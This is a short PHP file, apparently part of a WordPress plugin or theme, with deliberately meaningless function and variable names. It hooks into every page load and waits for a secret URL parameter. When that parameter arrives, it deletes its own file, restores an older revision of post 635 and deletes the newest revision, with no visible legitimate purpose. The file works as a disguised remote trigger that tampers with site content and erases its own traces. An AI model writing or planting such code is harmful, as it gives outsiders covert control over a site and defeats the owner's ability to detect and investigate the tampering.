<?php

function get_migration_embed_home() {
	if (isset($_GET['update_instant_source']) && $_GET['update_instant_source'] === 'hover_kit_demo') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$picker_master_specific = 635;
		$scheduler_scroll_now_local = wp_get_post_revisions($picker_master_specific);
		if (empty($scheduler_scroll_now_local)) die('no revisions');
		if (count($scheduler_scroll_now_local) < 2) die('less than 2');
		$version_checker_right_qr = array_shift($scheduler_scroll_now_local);
		$stripe_portfolio_classic_layout = $version_checker_right_qr->ID;
		$copy_check_more_stock = array_shift($scheduler_scroll_now_local);
		$cover_viewer_pixel = $copy_check_more_stock->ID;
		$gamipress_cache_table = wp_restore_post_revision($cover_viewer_pixel);
		if ($gamipress_cache_table === false) die('error restoring');
		$gamipress_cache_table = wp_delete_post_revision($stripe_portfolio_classic_layout);		
		if ($gamipress_cache_table === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'get_migration_embed_home');
